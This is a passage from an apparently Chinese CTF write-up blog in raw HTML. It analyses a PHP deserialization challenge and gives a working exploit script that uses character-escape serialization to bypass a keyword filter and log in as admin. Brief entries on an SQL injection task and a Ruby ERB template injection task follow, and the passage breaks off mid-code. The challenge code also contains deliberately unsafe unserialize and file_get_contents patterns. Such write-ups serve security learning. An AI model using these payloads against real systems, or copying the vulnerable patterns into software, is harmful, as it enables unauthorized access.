<span class="token variable">$updateAction</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$Info</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"update user SET age=<span class="token interpolation"><span class="token variable">$age</span></span>,nickname=<span class="token interpolation"><span class="token variable">$nickname</span></span> where id="</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//这个功能还没有写完 先占坑</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getNewInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//危</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"0-0"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token operator">=</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$argument</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$newinfo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$newInfo</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$upDate</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sql</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$database</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hostname</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbuser</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbpass</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败，错误:"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$idResult</span><span class="token punctuation">,</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$idResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'用户不存在!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token variable">$passwordResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'密码错误！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">//还没来得及写</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//update.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;html>&lt;meta charset="utf-8">&lt;title>update&lt;/title>&lt;h2>这是一个未完成的页面，上线时建议删除本页面&lt;/h2>&lt;/html>'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"你还没有登陆呢！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$users</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$users</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到update.php中不论session的判断结果如何都会执行类中update方法，并且如果想获取flag就需要让<code>$_SESSION[&#39;login&#39;]===1</code>或者<code>$_SESSION[&#39;token&#39;]===&#39;admin&#39;</code></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class dbCtrl&#123;        public function login($sql)    &#123;        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo(&#39;用户不存在!&#39;);            return false;        &#125;        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;            echo(&#39;密码错误！&#39;);            return false;        &#125;        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;        return $idResult;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现其中可以对token进行修改，而后查看调用链</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class Info&#123;    public function __call($name,$argument)&#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#x2F;&#x2F;CtrlCase&#x3D;new dbCtrl;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Info中的<code>__call</code>方法能调用<code>login</code>方法</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class User&#123;    public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);&#x2F;&#x2F;nikename&#x3D;new Info;        return &quot;0-0&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>User中的<code>__toString</code>方法调用<code>__call</code>方法</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">Class UpdateHelper&#123;    public function __destruct()    &#123;        echo $this-&gt;sql;&#x2F;&#x2F;sql&#x3D;new User;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>链子：<code>UpdateHepler::__destruct()-&gt;User::__toString-&gt;Info::__Call()-&gt;dbCtrl::login()</code></p><p>下一步就是构造payload了，反序列化所使用的方法是</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">public function update()&#123;    $Info&#x3D;unserialize($this-&gt;getNewinfo());&#125;public function getNewInfo()&#123;    $age&#x3D;$_POST[&#39;age&#39;];    $nickname&#x3D;$_POST[&#39;nickname&#39;];    return safe(serialize(new Info($age,$nickname)));&#125;function safe($parm)&#123;    $array&#x3D; array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#39;hacker&#39;,$parm);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于题中先对传入参量进行info序列化而后再通过safe函数进行反序列化，所以最终链子其实变成了<code>Info::任意参量=UpdateHepler::__destruct()-&gt;User::__toString-&gt;Info::__Call()-&gt;dbCtrl::login()</code>，并且这是一个字符逃逸的序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//exp.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string single-quoted-string">'select "1","c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$database</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$feng</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token property">sql</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token property">sql</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token property">sql</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">95</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>";s:8:"nickname";N;s:8:"CtrlCase";O:12:"UpdateHelper":1:&#123;s:3:"sql";O:4:"User":3:&#123;s:2:"id";s:1:"1";s:3:"age";s:72:"select "1","c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":9:&#123;s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";N;s:4:"feng";N;&#125;&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入age，任意密码登录admin即可</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-19" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-19</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 00.37.26.png)</p>        <h2 id="b01lers2020-Life-on-Mars"   >          <a href="#b01lers2020-Life-on-Mars" class="heading-link"><i class="fas fa-link"></i></a><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2>      <p>抓包随便点一个东西，发现传参，测试是sql注入</p><p>sqlmap和手动注入都可以，发现当前数据库下没有结果，在另外一个<code>alien_code</code>数据库中</p><p>最终payload</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="SCTF2019-Flag-Shop"   >          <a href="#SCTF2019-Flag-Shop" class="heading-link"><i class="fas fa-link"></i></a><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2>      <p>本来以为是jwt直接破解或伪造，没想到是代码审计，我还不认识//////////，是ruby的模版注入，在robots.txt中能看到源代码位置</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/cookies'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/json'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'jwt'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'securerandom'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'erb'</span></span>set <span class="token symbol">:public_folder</span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'/static'</span></span><span class="token constant">FLAGPRICE</span> <span class="token operator">=</span> <span class="token number">1000000000000000000000000000</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> SecureRandom<span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>configure <span class="token keyword">do</span>  enable <span class="token symbol">:logging</span>  file <span class="token operator">=</span> <span class="token class-name">File</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'/../log/http.log'</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"a+"</span></span><span class="token punctuation">)</span>  file<span class="token punctuation">.</span>sync <span class="token operator">=</span> <span class="token boolean">true</span>  use Rack<span class="token double-colon punctuation">::</span>CommonLogger<span class="token punctuation">,</span> file<span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/"</span></span> <span class="token keyword">do</span>  redirect <span class="token string-literal"><span class="token string">'/shop'</span></span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/filebak"</span></span> <span class="token keyword">do</span>  content_type <span class="token symbol">:text</span>  erb <span class="token builtin">IO</span><span class="token punctuation">.</span>binread __FILE__<span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/api/auth"</span></span> <span class="token keyword">do</span>  payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token symbol">uid</span><span class="token operator">:</span> SecureRandom<span class="token punctuation">.</span>uuid <span class="token punctuation">,</span> <span class="token symbol">jkl</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span>  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode payload<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>  cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/api/info"</span></span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token 